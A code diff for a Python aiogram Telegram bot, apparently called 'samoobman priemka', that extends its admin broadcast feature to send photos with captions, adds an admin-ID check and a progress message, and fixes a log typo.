+        "Отправьте сообщение (текст, картинку с подписью), которое будет разослано всем пользователям бота:",
+        reply_markup=kb, parse_mode="Markdown"
+    )
+    await state.set_state(AdminStates.waiting_for_broadcast_content)
 
 
-@router.message(AdminStates.waiting_for_broadcast_text)
+@router.message(AdminStates.waiting_for_broadcast_content)
 async def admin_send_broadcast(message: Message, state: FSMContext):
-    text = message.text
+    if message.from_user.id not in ADMIN_IDS:
+        return
+
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute("SELECT user_id FROM users") as cursor:
             users = await cursor.fetchall()
 
     count = 0
+    status_msg = await message.answer("⏳ Рассылка началась...")
+
     for u in users:
         try:
-            await bot.send_message(
-                chat_id=u[0],
-                text=f"📢 **Рассылка от samoobman priemka**\n\n{text}",
-                parse_mode="Markdown"
-            )
+            if message.photo:
+                await bot.send_photo(
+                    chat_id=u[0],
+                    photo=message.photo[-1].file_id,
+                    caption=message.caption or "",
+                    parse_mode="Markdown"
+                )
+            else:
+                await bot.send_message(
+                    chat_id=u[0],
+                    text=message.text,
+                    parse_mode="Markdown"
+                )
             count += 1
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(0.04)
         except Exception:
             pass
 
-    await message.answer(f"✅ Рассылка завершена. Успешно отправлено: `{count}` пользователям.", parse_mode="Markdown")
+    try:
+        await status_msg.edit_text(f"✅ Рассылка успешно завершена!\nПолучателей: `{count}`")
+    except Exception:
+        pass
+
     await state.clear()
 
 
@@ -1071,7 +1140,7 @@ async def admin_send_broadcast(message: Message, state: FSMContext):
 async def main():
     await init_db()
     await init_all_account_listeners()
-    logger.info("Бот samoobman priemka и фоновые слушатели сессий успешны запущены!")
+    logger.info("Бот samoobman priemka и фоновые слушатели сессий успешно запущены!")
     await dp.start_polling(bot)
 
 
